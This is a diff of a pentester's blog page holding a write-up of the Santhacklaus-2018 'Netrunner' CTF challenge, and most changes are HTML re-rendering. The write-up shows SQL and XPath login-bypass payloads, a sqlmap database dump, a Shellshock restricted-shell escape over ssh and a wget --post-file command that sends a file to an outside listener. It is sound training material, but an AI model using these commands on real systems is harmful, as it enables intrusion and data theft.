@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.92.1" />
+<meta name="generator" content="Hugo 0.121.2">
 
   <meta property="og:title" content="[CTF - Santhacklaus-2018] Netrunner" />
 <meta property="og:description" content="" />
@@ -44,7 +44,6 @@
   <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
 
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
 
     
   
@@ -105,9 +104,9 @@
 	
 
     <h1 class="brand-title">Thibaud Robin</h1>
-    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">@Trackflaw</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity</p>
+    <p>Personnal (old) blog to speak about cybersecurity</p>
 
     <nav class="nav">
       <ul class="nav-list sidebar-list">
@@ -126,7 +125,7 @@
     <div class="social-buttons">
       
         
-        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        <a href="https://github.com/trackflaw" target="_blank"><i class='fab fa-github'></i></a>
         
       
         
@@ -142,7 +141,7 @@
         
       
         
-        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        <a href="https://twitter.com/trackflaw" target="_blank"><i class='fab fa-twitter'></i></a>
         
       
       
@@ -278,8 +277,8 @@ pass = password
 <p>An XPath query that returns the account whose username is <code>th1b4ud</code> and the password is <code>p4sSw0rD</code> would be the following:</p>
 <p><code>string(//user[username/text()='th1b4ud' and password/text()='p4sSw0rD']/account/text()) </code></p>
 <p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p>
-<pre tabindex="0"><code>Username: ' or '1' = '1
-Password: ' or '1' = '1
+<pre tabindex="0"><code>Username: &#39; or &#39;1&#39; = &#39;1
+Password: &#39; or &#39;1&#39; = &#39;1
 </code></pre><p>Looks quite familiar, doesn&rsquo;t it? Using these parameters, the query becomes:</p>
 <p><code>string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text()) </code></p>
 <p>As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided.</p>
@@ -291,8 +290,8 @@ Password: ' or '1' = '1
 <p>Consider the following SQL query:</p>
 <p><code>SELECT * FROM Users WHERE Username='$username' AND Password='$password'</code></p>
 <p>A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied.</p>
-<pre tabindex="0"><code>$username = 1' or '1' = '1
-$password = 1' or '1' = '1
+<pre tabindex="0"><code>$username = 1&#39; or &#39;1&#39; = &#39;1
+$password = 1&#39; or &#39;1&#39; = &#39;1
 </code></pre><p>The query will be:</p>
 <p><code>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' </code></p>
 <p>But remember ! We already test this payload with XPath injection. We need to go deeper !</p>
@@ -304,9 +303,9 @@ $password = 1' or '1' = '1
 </div>
 <p>Look at my last protips. I speak about <code>SLEEP()</code> function to detect entry point. The function <code>SLEEP()</code> (in mysql and in others database engine) permit to stop the server for a while. We will exploit this functionnality to detect if an entry is vulnerable. The application run with php. I hope the database engine is MySql or an other engine who support <code>SLEEP()</code> function. We shall see !</p>
 <p>These query should do the trick :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">username=th1b4ud<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
-username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
-</code></pre></div><p><img src="/img/santhacklaus/netrunner1.gif" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>username=th1b4ud<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
+</span></span><span style="display:flex;"><span>username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
+</span></span></code></pre></div><p><img src="/img/santhacklaus/netrunner1.gif" alt=""></p>
 <p><img src="https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif" alt=""></p>
 <p>HOHO ! We found something ! We&rsquo;ve got a sql injection vulnerability in the username ! Nice ! It&rsquo;s time to confirm that there is a mysql database behind the application.</p>
 <div class="alert protips">
@@ -336,15 +335,15 @@ username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1
 <li><strong>Database engine (<code>--dbms</code>)</strong> : <code>mysql</code></li>
 <li><strong>Action to perform</strong> : dump the database with <code>--dump</code></li>
 </ul>
-<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ sqlmap -u &quot;http://51.75.202.113:2077/zetatech-admin.php&quot; --data &quot;username=test&amp;password=test&amp;login=Login&quot; -p &quot;username&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ sqlmap -u &#34;http://51.75.202.113:2077/zetatech-admin.php&#34; --data &#34;username=test&amp;password=test&amp;login=Login&#34; -p &#34;username&#34; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
         ___
        __H__
  ___ ___[.]_____ ___ ___  {1.2.11#stable}
-|_ -| . [.]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
+|_ -| . [.]     | .&#39;| . |
+|___|_  [&#39;]_|_|_|__,|  _|
       |_|V          |_|   http://sqlmap.org
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
 [*] starting at 13:35:34
 
@@ -352,7 +351,7 @@ username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1
 Parameter: username (POST)
     Type: AND/OR time-based blind
     Title: MySQL &gt;= 5.0.12 AND time-based blind
-    Payload: username=test'||(SELECT 0x74657745 FROM DUAL WHERE 4732=4732 AND SLEEP(5))||'&amp;password=test&amp;login=Login
+    Payload: username=test&#39;||(SELECT 0x74657745 FROM DUAL WHERE 4732=4732 AND SLEEP(5))||&#39;&amp;password=test&amp;login=Login
 ---
 
 [...]
@@ -367,13 +366,13 @@ Table: access
 | 2  | puppet-master | 31e2d9e7ee8279341dee46986670996145a699937616fd03fe362426b5b47c25 |
 +----+---------------+------------------------------------------------------------------+
 
-[15:15:35] [INFO] table '`ctf-zetatech-inc`.access' dumped to CSV file '/home/th1b4ud/.sqlmap/output/51.75.202.113/dump/ctf-zetatech-inc/access.csv'
-[15:15:35] [INFO] fetched data logged to text files under '/home/th1b4ud/.sqlmap/output/51.75.202.113'
+[15:15:35] [INFO] table &#39;`ctf-zetatech-inc`.access&#39; dumped to CSV file &#39;/home/th1b4ud/.sqlmap/output/51.75.202.113/dump/ctf-zetatech-inc/access.csv&#39;
+[15:15:35] [INFO] fetched data logged to text files under &#39;/home/th1b4ud/.sqlmap/output/51.75.202.113&#39;
 
 [*] shutting down at 15:15:35
 </code></pre><p>Ho finally ! We dump the database ! We&rsquo;ve got two users : <code>admin</code> and <code>puppet-master</code>. Let&rsquo;s try a very simple injection with these informations.</p>
-<pre tabindex="0"><code>admin'#
-puppet-master'#
+<pre tabindex="0"><code>admin&#39;#
+puppet-master&#39;#
 </code></pre><p>With admin</p>
 <p><img src="/img/santhacklaus/netrunner8.png" alt=""></p>
 <p>Sad :(</p>
@@ -472,28 +471,28 @@ Connection to 51.75.202.113 closed.
 </code></pre><p>Ho ! Connection closed ! Maybe we have to bypass a restricted shell or a similar protection.
 Lets type the question to Google : <code>escape restricted shell</code> and click on the first link : <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells</a></p>
 <p>Look at the ninth slide :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Use SSH on your machine to execute commands before the remote shell is loaded</span>
-ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
-
-<span style="color:#75715e"># Or start the remote shell without loading &#34;rc&#34; profile (where most of the limitations are often configured)</span>
-ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;bash --noprofile&#34;</span>
-
-<span style="color:#75715e"># Try ShellShock on vulnerable shell implementations</span>
-ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;() { :; }; /bin/bash&#34;</span>
-</code></pre></div><p>Let&rsquo;s try this 3 commands</p>
-<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
-
-[...]
-
-Connection to 51.75.202.113 closed.
-</code></pre><p>No</p>
-<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;bash --noprofile&quot;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Use SSH on your machine to execute commands before the remote shell is loaded</span>
+</span></span><span style="display:flex;"><span>ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Or start the remote shell without loading &#34;rc&#34; profile (where most of the limitations are often configured)</span>
+</span></span><span style="display:flex;"><span>ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;bash --noprofile&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Try ShellShock on vulnerable shell implementations</span>
+</span></span><span style="display:flex;"><span>ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;() { :; }; /bin/bash&#34;</span>
+</span></span></code></pre></div><p>Let&rsquo;s try this 3 commands</p>
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &#34;/bin/sh&#34;
 
 [...]
 
 Connection to 51.75.202.113 closed.
 </code></pre><p>No</p>
-<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;() { :; }; /bin/bash&quot;
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &#34;bash --noprofile&#34;
+
+[...]
+
+Connection to 51.75.202.113 closed.
+</code></pre><p>No</p>
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &#34;() { :; }; /bin/bash&#34;
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
 ./__.[___  |  |  |  |  [___\__.|  |
@@ -504,10 +503,10 @@ puppet-master@2a87f3ade358:~$
 </code></pre><p>WUT ? O.O</p>
 <p><img src="https://media.giphy.com/media/aWPGuTlDqq2yc/giphy.gif" alt=""></p>
 <p>Stop, stop, stop ! Shellshock ?!? Really ?!?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">puppet-master@2a87f3ade358:~$ env x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style="color:#e6db74">&#34;echo this is a test&#34;</span>
-vulnerable
-this is a test
-</code></pre></div><p>Ok&hellip; Shellshock \o/</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>puppet-master@2a87f3ade358:~$ env x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style="color:#e6db74">&#34;echo this is a test&#34;</span>
+</span></span><span style="display:flex;"><span>vulnerable
+</span></span><span style="display:flex;"><span>this is a test
+</span></span></code></pre></div><p>Ok&hellip; Shellshock \o/</p>
 <p>What is Shellshock ?</p>
 <p><code>Shellshock, also known as Bashdoor, is a family of security bugs in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.</code></p>
 <p>Thank you Wikipedia. There is many articles on Internet who will do a better explanation than me, in particular this one : <a href="https://fedoramagazine.org/shellshock-how-does-it-actually-work/">https://fedoramagazine.org/shellshock-how-does-it-actually-work/</a></p>
@@ -571,28 +570,28 @@ listening on [any] 4444 ...
 </code></pre><p>This is the option we need ! Let&rsquo;s execute <code>wget</code> with <code>zetatech-maintenance</code> group permission.</p>
 <pre tabindex="0"><code>sudo -g zetatech-maintenance wget --post-file tech.note 12.34.56.78:4444
 </code></pre><p>Ho ! Something appeared on the listener !</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">connect to <span style="color:#f92672">[</span>192.168.0.50<span style="color:#f92672">]</span> from 113.ip-51-75-202.eu <span style="color:#f92672">[</span>51.75.202.113<span style="color:#f92672">]</span> <span style="color:#ae81ff">58604</span>
-POST / HTTP/1.1
-User-Agent: Wget/1.18 <span style="color:#f92672">(</span>linux-gnu<span style="color:#f92672">)</span>
-Accept: */*
-Accept-Encoding: identity
-Host: 79.85.186.254:4444
-Connection: Keep-Alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: <span style="color:#ae81ff">266</span>
-
-
-.___..___.___..__..___..___ __ .  .
-  _/ <span style="color:#f92672">[</span>__   |  <span style="color:#f92672">[</span>__<span style="color:#f92672">]</span>  |  <span style="color:#f92672">[</span>__ /  <span style="color:#e6db74">`</span>|__|
-./__.<span style="color:#f92672">[</span>___  |  |  |  |  <span style="color:#f92672">[</span>___<span style="color:#ae81ff">\_</span>_.|  |
-
-
-:::: Admin Note ::::
-
-Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.
-
-:: IMTLD<span style="color:#f92672">{</span>Wh3r3_d03s_HuM4n1tY_3nd<span style="color:#f92672">}</span>
-</code></pre></div><h1 id="conclusion">Conclusion</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.0.50<span style="color:#f92672">]</span> from 113.ip-51-75-202.eu <span style="color:#f92672">[</span>51.75.202.113<span style="color:#f92672">]</span> <span style="color:#ae81ff">58604</span>
+</span></span><span style="display:flex;"><span>POST / HTTP/1.1
+</span></span><span style="display:flex;"><span>User-Agent: Wget/1.18 <span style="color:#f92672">(</span>linux-gnu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Encoding: identity
+</span></span><span style="display:flex;"><span>Host: 79.85.186.254:4444
+</span></span><span style="display:flex;"><span>Connection: Keep-Alive
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">266</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.___..___.___..__..___..___ __ .  .
+</span></span><span style="display:flex;"><span>  _/ <span style="color:#f92672">[</span>__   |  <span style="color:#f92672">[</span>__<span style="color:#f92672">]</span>  |  <span style="color:#f92672">[</span>__ /  <span style="color:#e6db74">`</span>|__|
+</span></span><span style="display:flex;"><span>./__.<span style="color:#f92672">[</span>___  |  |  |  |  <span style="color:#f92672">[</span>___<span style="color:#ae81ff">\_</span>_.|  |
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>:::: Admin Note ::::
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>:: IMTLD<span style="color:#f92672">{</span>Wh3r3_d03s_HuM4n1tY_3nd<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
 <p>So what do we learned with this challenge ?</p>
 <ul>
 <li>Learn how to test an authentication form.</li>
@@ -622,7 +621,7 @@ Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following ge
 		</ul>
 	</div>
 
-	<p>&copy; 2022. All rights reserved.</p>
+	<p>&copy; 2024. All rights reserved.</p>
 </div>
     </div>
   </div>
